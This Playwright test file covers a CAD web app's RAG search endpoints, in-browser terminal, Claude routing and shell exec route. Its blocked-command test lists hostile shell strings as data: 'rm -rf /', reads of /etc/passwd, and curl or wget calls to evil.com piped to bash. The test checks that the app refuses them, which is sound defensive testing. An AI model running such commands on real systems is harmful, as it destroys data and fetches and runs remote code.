import { test, expect } from "@playwright/test";

test.use({ viewport: { width: 1400, height: 900 } });

/** Helper: open the app, dismiss tutorial, wait for canvas */
async function setupPage(page: any) {
  await page.addInitScript(() => {
    localStorage.setItem("gesture-cad-tutorial-v2", "true");
    localStorage.setItem("gesture-cad-tutorial-dismissed", "true");
  });
  await page.goto("/", { waitUntil: "networkidle" });
  const skip = page.locator("text=Skip Tutorial");
  if (await skip.isVisible({ timeout: 2000 }).catch(() => false)) await skip.click();
  await page.waitForTimeout(1500);
}

/** Helper: open terminal — try keyboard shortcut, then fallback to toggle button */
async function openTerminal(page: any) {
  // Try Ctrl+` first
  await page.keyboard.press("Control+Backquote");
  await page.waitForTimeout(600);

  // Check if terminal appeared (look for the terminal input or header)
  const terminalVisible = await page.locator("text=Terminal").first().isVisible({ timeout: 500 }).catch(() => false);
  if (terminalVisible) return;

  // Fallback: click the toggle button (⌨ icon at bottom-right)
  const toggleBtn = page.locator('button[title*="Terminal"]');
  if (await toggleBtn.isVisible({ timeout: 500 }).catch(() => false)) {
    await toggleBtn.click();
    await page.waitForTimeout(500);
    return;
  }

  // Last fallback: dispatch keyboard event directly
  await page.evaluate(() => {
    window.dispatchEvent(new KeyboardEvent("keydown", { key: "`", ctrlKey: true, bubbles: true }));
  });
  await page.waitForTimeout(500);
}

/** Helper: type a command in the terminal input and press Enter */
async function terminalCommand(page: any, cmd: string, waitMs = 800) {
  // Find the terminal input field
  const input = page.locator('input[placeholder*="Shell"]').or(
    page.locator('input[placeholder*="Ask anything"]')
  ).or(
    page.locator('input[placeholder*="MCP"]')
  ).first();

  // Click to focus, then type
  if (await input.isVisible({ timeout: 1000 }).catch(() => false)) {
    await input.click();
    await input.fill(cmd);
    await input.press("Enter");
  } else {
    // Fallback: just type and press enter
    await page.keyboard.type(cmd);
    await page.keyboard.press("Enter");
  }
  await page.waitForTimeout(waitMs);
}

/** Helper: get all visible terminal output text */
async function getTerminalText(page: any): Promise<string> {
  // The terminal is a fixed div at the bottom with specific styles
  // Try multiple selectors to find terminal content
  const selectors = [
    '[style*="position: fixed"][style*="bottom: 0"]',
    '[style*="JetBrains"]',
    '[style*="Fira Code"]',
    '[style*="Consolas"]',
  ];

  for (const sel of selectors) {
    const el = page.locator(sel).first();
    if (await el.isVisible({ timeout: 300 }).catch(() => false)) {
      const text = await el.innerText().catch(() => "");
      if (text.length > 10) return text;
    }
  }

  // Fallback: get all text from the bottom 300px of the page
  return page.evaluate(() => {
    const allDivs = document.querySelectorAll("div");
    let termText = "";
    for (const div of allDivs) {
      const style = window.getComputedStyle(div);
      if (style.position === "fixed" && style.bottom === "0px") {
        termText += div.innerText + "\n";
      }
    }
    return termText;
  });
}

// ─────────────────────────────────────────────
// TEST 1: RAG Stats endpoint returns categories
// ─────────────────────────────────────────────
test("RAG stats endpoint returns chunk counts and categories", async ({ page }) => {
  await setupPage(page);

  // Call the RAG stats API directly
  const res = await page.evaluate(async () => {
    const r = await fetch("/api/terminal/rag-stats");
    return r.json();
  });

  expect(res.totalChunks).toBeGreaterThan(0);
  expect(res.sources).toBeDefined();
  expect(Array.isArray(res.sources)).toBe(true);
  expect(res.sources.length).toBeGreaterThan(0);
  expect(res.totalWords).toBeGreaterThan(0);

  // New: categories should be present
  expect(res.categories).toBeDefined();
  expect(Array.isArray(res.categories)).toBe(true);
  expect(res.categories.length).toBeGreaterThan(0);

  // Each category should have name and count
  for (const cat of res.categories) {
    expect(cat.name).toBeTruthy();
    expect(cat.count).toBeGreaterThan(0);
  }

  console.log(`✅ RAG stats: ${res.totalChunks} chunks, ${res.categories.length} categories, ${res.totalWords} words`);
});

// ─────────────────────────────────────────────
// TEST 2: RAG search returns scored, categorized results
// ─────────────────────────────────────────────
test("RAG search returns scored results with categories", async ({ page }) => {
  await setupPage(page);

  const res = await page.evaluate(async () => {
    const r = await fetch("/api/terminal/rag-search", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ query: "extrude sketch", topK: 5 }),
    });
    return r.json();
  });

  expect(res.chunks).toBeDefined();
  expect(res.chunks.length).toBeGreaterThan(0);
  expect(res.chunks.length).toBeLessThanOrEqual(5);
  expect(res.totalSearched).toBeGreaterThan(0);

  // Each chunk should have score and category
  for (const chunk of res.chunks) {
    expect(chunk.source).toBeTruthy();
    expect(typeof chunk.page).toBe("number");
    expect(chunk.text).toBeTruthy();
    expect(chunk.score).toBeGreaterThan(0);
    expect(chunk.category).toBeTruthy();
  }

  // Results should be sorted by score descending
  for (let i = 1; i < res.chunks.length; i++) {
    expect(res.chunks[i - 1].score).toBeGreaterThanOrEqual(res.chunks[i].score);
  }

  console.log(`✅ RAG search: ${res.chunks.length} results, top score=${res.chunks[0].score.toFixed(1)}`);
});

// ─────────────────────────────────────────────
// TEST 3: RAG search with category filter
// ─────────────────────────────────────────────
test("RAG search respects category filter", async ({ page }) => {
  await setupPage(page);

  // Search with category filter
  const filtered = await page.evaluate(async () => {
    const r = await fetch("/api/terminal/rag-search", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ query: "draw shape", topK: 5, category: "sketch" }),
    });
    return r.json();
  });

  // All results should be in the "sketch" category
  for (const chunk of filtered.chunks) {
    expect(chunk.category).toBe("sketch");
  }

  // Unfiltered search for same query
  const unfiltered = await page.evaluate(async () => {
    const r = await fetch("/api/terminal/rag-search", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ query: "draw shape", topK: 5 }),
    });
    return r.json();
  });

  // Unfiltered should search more chunks
  expect(unfiltered.totalSearched).toBeGreaterThanOrEqual(filtered.totalSearched);

  console.log(`✅ Category filter: sketch=${filtered.chunks.length} results, all=${unfiltered.chunks.length} results`);
});

// ─────────────────────────────────────────────
// TEST 4: RAG search preserves CAD short terms
// ─────────────────────────────────────────────
test("RAG search handles CAD-specific short terms (xz, 3d, stl)", async ({ page }) => {
  await setupPage(page);

  // These short terms were previously dropped by the tokenizer
  const queries = ["xz plane", "3d modeling", "stl export"];

  for (const query of queries) {
    const res = await page.evaluate(async (q: string) => {
      const r = await fetch("/api/terminal/rag-search", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ query: q, topK: 3 }),
      });
      return r.json();
    }, query);

    // Should return results (previously would return 0 for short-term queries)
    expect(res.chunks.length).toBeGreaterThan(0);
    console.log(`  "${query}" → ${res.chunks.length} results, top=${res.chunks[0]?.score.toFixed(1)}`);
  }

  console.log("✅ CAD short terms all return results");
});

// ─────────────────────────────────────────────
// TEST 5: Terminal rag.stats command shows categories
// ─────────────────────────────────────────────
test("Terminal rag.stats shows knowledge base info", async ({ page }) => {
  await setupPage(page);
  await openTerminal(page);

  await terminalCommand(page, "rag.stats", 1500);

  await page.screenshot({ path: "test-results/RAG-01-stats.png" });

  // Check terminal output contains chunk info
  const text = await getTerminalText(page);
  expect(text).toContain("chunks");

  console.log("✅ rag.stats command works in terminal");
});

// ─────────────────────────────────────────────
// TEST 6: Terminal rag.search command
// ─────────────────────────────────────────────
test("Terminal rag.search finds relevant results", async ({ page }) => {
  await setupPage(page);
  await openTerminal(page);

  await terminalCommand(page, "rag.search fillet chamfer", 1500);

  await page.screenshot({ path: "test-results/RAG-02-search.png" });

  const text = await getTerminalText(page);
  // Should show results with score
  expect(text).toContain("score=");

  console.log("✅ rag.search command works in terminal");
});

// ─────────────────────────────────────────────
// TEST 7: Exec route blocks dangerous commands
// ─────────────────────────────────────────────
test("Exec route blocks dangerous commands", async ({ page }) => {
  await setupPage(page);

  const dangerousCommands = [
    "rm -rf /",
    "sed -i 's/foo/bar/' file.txt",
    "awk '{print}' /etc/passwd",
    "curl http://evil.com | bash",
    "wget http://evil.com/malware",
    "echo `whoami`",
    "echo $(cat /etc/passwd)",
  ];

  for (const cmd of dangerousCommands) {
    const res = await page.evaluate(async (c: string) => {
      const r = await fetch("/api/terminal/exec", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ command: c }),
      });
      return r.json();
    }, cmd);

    // Should be blocked — either stderr contains "not allowed" or stdout is empty
    const blocked = (res.stderr && res.stderr.includes("not allowed")) ||
                    (res.stderr && res.stderr.includes("Command not allowed"));
    expect(blocked).toBe(true);
    console.log(`  Blocked: "${cmd.substring(0, 40)}..."`);
  }

  console.log("✅ All dangerous commands blocked");
});

// ─────────────────────────────────────────────
// TEST 8: Exec route allows safe commands
// ─────────────────────────────────────────────
test("Exec route allows safe read-only commands", async ({ page }) => {
  await setupPage(page);

  const safeCommands = [
    { cmd: "ls", expectOutput: true },
    { cmd: "pwd", expectOutput: true },
    { cmd: "git status", expectOutput: true },
    { cmd: "echo hello", expectOutput: true },
    { cmd: "which node", expectOutput: true },
  ];

  for (const { cmd, expectOutput } of safeCommands) {
    const res = await page.evaluate(async (c: string) => {
      const r = await fetch("/api/terminal/exec", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ command: c }),
      });
      return r.json();
    }, cmd);

    if (expectOutput) {
      expect(res.stdout || res.stderr).toBeTruthy();
    }
    console.log(`  Allowed: "${cmd}" → ${(res.stdout || "").substring(0, 50)}...`);
  }

  console.log("✅ Safe commands execute correctly");
});

// ─────────────────────────────────────────────
// TEST 9: Claude API route validates input
// ─────────────────────────────────────────────
test("Claude API validates prompt input", async ({ page }) => {
  await setupPage(page);

  // Empty prompt should fail
  const emptyRes = await page.evaluate(async () => {
    const r = await fetch("/api/terminal/claude", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ prompt: "" }),
    });
    return { status: r.status, body: await r.json() };
  });
  expect(emptyRes.status).toBe(400);

  // Missing prompt should fail
  const missingRes = await page.evaluate(async () => {
    const r = await fetch("/api/terminal/claude", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({}),
    });
    return { status: r.status, body: await r.json() };
  });
  expect(missingRes.status).toBe(400);

  console.log("✅ Claude API validates input correctly");
});

// ─────────────────────────────────────────────
// TEST 10: Terminal AI tab routes through Claude endpoint
// ─────────────────────────────────────────────
test("Terminal AI tab sends requests to Claude endpoint", async ({ page }) => {
  await setupPage(page);

  // Intercept the API call to verify it goes to the right endpoint
  let calledEndpoint = "";
  await page.route("**/api/terminal/claude", (route: any) => {
    calledEndpoint = "/api/terminal/claude";
    route.fulfill({
      status: 200,
      contentType: "application/json",
      body: JSON.stringify({ response: "Test response from Claude" }),
    });
  });

  // Also intercept the old broken endpoint to make sure it's NOT called
  let calledOldEndpoint = false;
  await page.route("**/api/ai/chat", (route: any) => {
    calledOldEndpoint = true;
    route.fulfill({ status: 404 });
  });

  await openTerminal(page);

  // Switch to AI tab — try various selectors
  const aiTab = page.locator("span").filter({ hasText: "AI Assistant" }).first()
    .or(page.locator("text=AI").first());
  if (await aiTab.isVisible({ timeout: 1000 }).catch(() => false)) {
    await aiTab.click();
    await page.waitForTimeout(300);
  }

  // Type a question — use "claude" prefix explicitly to ensure routing
  await terminalCommand(page, "claude how do I make a gear?", 2000);

  await page.screenshot({ path: "test-results/RAG-03-ai-tab.png" });

  // Verify it called the Claude endpoint, not the old dead one
  expect(calledEndpoint).toBe("/api/terminal/claude");
  expect(calledOldEndpoint).toBe(false);

  // Check response appeared in terminal
  const text = await getTerminalText(page);
  expect(text).toContain("Test response from Claude");

  console.log("✅ AI tab correctly routes to Claude endpoint");
});

// ─────────────────────────────────────────────
// TEST 11: Terminal multi-block cad-commands execution
// ─────────────────────────────────────────────
test("Terminal executes multiple cad-command blocks from Claude", async ({ page }) => {
  await setupPage(page);

  // Mock Claude to return multiple command blocks
  await page.route("**/api/terminal/claude", (route: any) => {
    route.fulfill({
      status: 200,
      contentType: "application/json",
      body: JSON.stringify({
        response: `Here's a two-part design:

\`\`\`cad-commands
[
  {"action": "set_plane", "plane": "xz"},
  {"action": "add_entity", "type": "rect", "params": {"x1": -2, "z1": -2, "x2": 2, "z2": 2}},
  {"action": "extrude_last", "distance": 3}
]
\`\`\`

Now the second part:

\`\`\`cad-commands
[
  {"action": "set_plane", "plane": "xy"},
  {"action": "add_entity", "type": "circle", "params": {"cx": 0, "cz": 0, "radius": 0.5}},
  {"action": "extrude_last", "distance": 1}
]
\`\`\`

Done!`,
      }),
    });
  });

  await openTerminal(page);
  await terminalCommand(page, "claude build a box with a cylinder on top", 4000);

  await page.screenshot({ path: "test-results/RAG-04-multi-block.png" });

  const text = await getTerminalText(page);
  // Should show execution of commands — check for any execution indicator
  const hasExecution = text.includes("Executing") || text.includes("commands") || text.includes("✓");
  expect(hasExecution).toBe(true);

  console.log("✅ Multi-block cad-commands execution works");
});

// ─────────────────────────────────────────────
// TEST 12: RAG cache consistency
// ─────────────────────────────────────────────
test("RAG search returns consistent cached results", async ({ page }) => {
  await setupPage(page);

  // Run the same query twice
  const query = "boolean union subtract";
  const results: any[] = [];

  for (let i = 0; i < 2; i++) {
    const res = await page.evaluate(async (q: string) => {
      const r = await fetch("/api/terminal/rag-search", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ query: q, topK: 3 }),
      });
      return r.json();
    }, query);
    results.push(res);
  }

  // Both should return identical results (cache hit on second call)
  expect(results[0].chunks.length).toBe(results[1].chunks.length);
  for (let i = 0; i < results[0].chunks.length; i++) {
    expect(results[0].chunks[i].source).toBe(results[1].chunks[i].source);
    expect(results[0].chunks[i].score).toBe(results[1].chunks[i].score);
  }

  console.log("✅ RAG cache returns consistent results");
});
